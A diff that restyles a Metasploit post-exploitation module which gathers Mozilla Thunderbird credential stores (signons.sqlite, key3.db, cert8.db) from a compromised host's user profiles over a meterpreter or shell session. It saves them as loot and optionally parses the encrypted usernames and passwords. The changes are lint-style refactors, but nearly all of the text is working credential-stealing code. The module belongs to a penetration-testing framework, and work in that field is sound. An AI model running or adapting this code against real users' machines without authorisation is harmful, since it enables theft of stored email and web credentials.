@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,31 +7,29 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => "Multi Gather Mozilla Thunderbird Signon Credential Collection",
-      'Description'    => %q{
-          This module will collect credentials from Mozilla Thunderbird by downloading
-        the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
-        offline decryption with third party tools.
+                      'Name'           => "Multi Gather Mozilla Thunderbird Signon Credential Collection",
+                      'Description'    => %q(
+                          This module will collect credentials from Mozilla Thunderbird by downloading
+                        the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
+                        offline decryption with third party tools.
 
-          If necessary, you may also set the PARSE optioin to true to parse the sqlite
-        file, which contains sensitive information such as the encrypted username/password.
-        However, this feature is not enabled by default, because it requires SQLITE3 gem
-        to be installed on your machine.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'sinn3r',  #Metasploit
-        ],
-      'Platform'       => %w{ linux osx win },
-      'SessionTypes'   => ['meterpreter', 'shell']
-      ))
+                          If necessary, you may also set the PARSE optioin to true to parse the sqlite
+                        file, which contains sensitive information such as the encrypted username/password.
+                        However, this feature is not enabled by default, because it requires SQLITE3 gem
+                        to be installed on your machine.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'sinn3r', # Metasploit
+                        ],
+                      'Platform'       => %w(linux osx win),
+                      'SessionTypes'   => ['meterpreter', 'shell']))
 
     register_options(
       [
@@ -49,11 +48,11 @@ class MetasploitModule < Msf::Post
       user = session.shell_command("whoami").chomp
       base = "/Users/#{user}/Library/Thunderbird/Profiles/"
     when 'windows'
-      if session.type == 'meterpreter'
-        user_profile = session.sys.config.getenv('APPDATA')
-      else
-        user_profile = cmd_exec("echo %APPDATA%").strip
-      end
+      user_profile = if session.type == 'meterpreter'
+                       session.sys.config.getenv('APPDATA')
+                     else
+                       cmd_exec("echo %APPDATA%").strip
+                     end
       base = user_profile + "\\Thunderbird\\Profiles\\"
     end
 
@@ -65,7 +64,7 @@ class MetasploitModule < Msf::Post
     # Steal!
     profiles.each do |profile|
       next if profile =~ /^\./
-      slash = (session.platform == 'windows') ? "\\" : "/"
+      slash = session.platform == 'windows' ? "\\" : "/"
       p = base + profile + slash
 
       # Download the database, and attempt to process the content
@@ -90,24 +89,22 @@ class MetasploitModule < Msf::Post
         vprint_status("Downloading: #{p + item}")
         begin
           f = session.fs.file.new(p + item, 'rb')
-          until f.eof?
-            loot << f.read
-          end
+          loot << f.read until f.eof?
         rescue ::Exception => e
         ensure
           f.close
         end
       elsif session.type == 'shell'
-        cmd_show = (session.platform == 'windows') ? 'type' : 'cat'
+        cmd_show = session.platform == 'windows' ? 'type' : 'cat'
         # The type command will add a 0x0a character in the file?  Pff.
         # Gotta lstrip that.
-        loot = cmd_exec(cmd_show, "\"#{p+item}\"").lstrip
+        loot = cmd_exec(cmd_show, "\"#{p + item}\"").lstrip
         next if loot =~ /system cannot find the file specified|No such file/
       end
 
       # Save it
       ext = ::File.extname(item)
-      ext = ext[1,ext.length]
+      ext = ext[1, ext.length]
 
       path = store_loot(
         "tb.#{item}",
@@ -115,26 +112,27 @@ class MetasploitModule < Msf::Post
         session,
         loot,
         "thunderbird_raw_#{item}",
-        "Thunderbird Raw File #{item}")
+        "Thunderbird Raw File #{item}"
+      )
 
       print_status("#{item} saved in #{path}")
 
       # Parse signons.sqlite
-      if item =~ /signons\.sqlite/ and datastore['PARSE']
-        print_status("Parsing signons.sqlite...")
-        data_tbl = parse(path)
-        if data_tbl.nil? or data_tbl.rows.empty?
-          print_status("No data parsed")
-        else
-          path = store_loot(
-            "tb.parsed.#{item}",
-            "text/plain",
-            session,
-            data_tbl.to_csv,
-            "thunderbird_parsed_#{item}",
-            "Thunderbird Parsed File #{item}")
-          print_status("Parsed signons.sqlite saved in: #{path}")
-        end
+      next unless item =~ /signons\.sqlite/ && datastore['PARSE']
+      print_status("Parsing signons.sqlite...")
+      data_tbl = parse(path)
+      if data_tbl.nil? || data_tbl.rows.empty?
+        print_status("No data parsed")
+      else
+        path = store_loot(
+          "tb.parsed.#{item}",
+          "text/plain",
+          session,
+          data_tbl.to_csv,
+          "thunderbird_parsed_#{item}",
+          "Thunderbird Parsed File #{item}"
+        )
+        print_status("Parsed signons.sqlite saved in: #{path}")
       end
     end
   end
@@ -158,7 +156,7 @@ class MetasploitModule < Msf::Post
     begin
       columns, *rows = db.execute('select * from moz_logins')
     rescue ::Exception => e
-      print_error("doh! #{e.to_s}")
+      print_error("doh! #{e}")
       return nil
     ensure
       db.close
@@ -184,18 +182,18 @@ class MetasploitModule < Msf::Post
     # Parse the db, store the data
     rows.each do |row|
       tbl << [
-        row[1],  #hostname
-        row[2],  #httpRealm
-        row[3],  #formSubmitURL (could be nil)
-        row[4],  #usernameField
-        row[5],  #passwordField
-        row[6],  #encryptedUsername
-        row[7],  #encryptedPassword
-        row[8]   #guid
+        row[1],  # hostname
+        row[2],  # httpRealm
+        row[3],  # formSubmitURL (could be nil)
+        row[4],  # usernameField
+        row[5],  # passwordField
+        row[6],  # encryptedUsername
+        row[7],  # encryptedPassword
+        row[8]   # guid
       ]
     end
 
-    return tbl
+    tbl
   end
 
   #
@@ -210,33 +208,31 @@ class MetasploitModule < Msf::Post
         tb_profiles << subdir
       end
     else
-      cmd = (session.platform == 'windows') ? "dir \"#{path}\"" : "ls -ld #{path}*/"
+      cmd = session.platform == 'windows' ? "dir \"#{path}\"" : "ls -ld #{path}*/"
       dir = cmd_exec(cmd)
       dir.each_line do |line|
         line = line.strip
         next if session.platform == 'windows' && line !~ /<DIR>((.+)\.(\w+)$)/
         next if (session.platform == 'linux' || session.platform == 'osx') && line !~ /(\w+\.\w+)/
-        tb_profiles << $1 if not $1.nil?
+        tb_profiles << Regexp.last_match(1) unless Regexp.last_match(1).nil?
       end
     end
-    return tb_profiles
+    tb_profiles
   end
 end
 
-=begin
-If you're really curious about Mozilla's encryption/descryption API, download this:
-ftp://ftp.mozilla.org/pub/mozilla.org/thunderbird/releases/8.0/source/
-
-And then read the following files:
-mozilla/security/manager/ssl/src/nsSDR.cpp
-mozilla/security/nss/lib/pk11wrap/pk11sdr.c
-
-Using a 3rd party decryptor is easier because Mozilla uses 2 different databases
-(SQLite and Berkeley DB) to store the crypto information.  This makes proper decryption
-implementation kind of uneasy, because railgun currently doesn't support SQLite3 and
-BDB (require special handling -- it's not like you can do LoadLibrary('mozsqlite3.dll')
-to load the lib).  Not to mention you need to borrow several more Mozilla components to
-do the decryption.  BDB gem unfortunately is kind of busted during my testing, so I guess
-we can pretty much forget about doing the decryption locally... chances are a lot of
-users would have problems just to get that setup going anyway.
-=end
+# If you're really curious about Mozilla's encryption/descryption API, download this:
+# ftp://ftp.mozilla.org/pub/mozilla.org/thunderbird/releases/8.0/source/
+#
+# And then read the following files:
+# mozilla/security/manager/ssl/src/nsSDR.cpp
+# mozilla/security/nss/lib/pk11wrap/pk11sdr.c
+#
+# Using a 3rd party decryptor is easier because Mozilla uses 2 different databases
+# (SQLite and Berkeley DB) to store the crypto information.  This makes proper decryption
+# implementation kind of uneasy, because railgun currently doesn't support SQLite3 and
+# BDB (require special handling -- it's not like you can do LoadLibrary('mozsqlite3.dll')
+# to load the lib).  Not to mention you need to borrow several more Mozilla components to
+# do the decryption.  BDB gem unfortunately is kind of busted during my testing, so I guess
+# we can pretty much forget about doing the decryption locally... chances are a lot of
+# users would have problems just to get that setup going anyway.
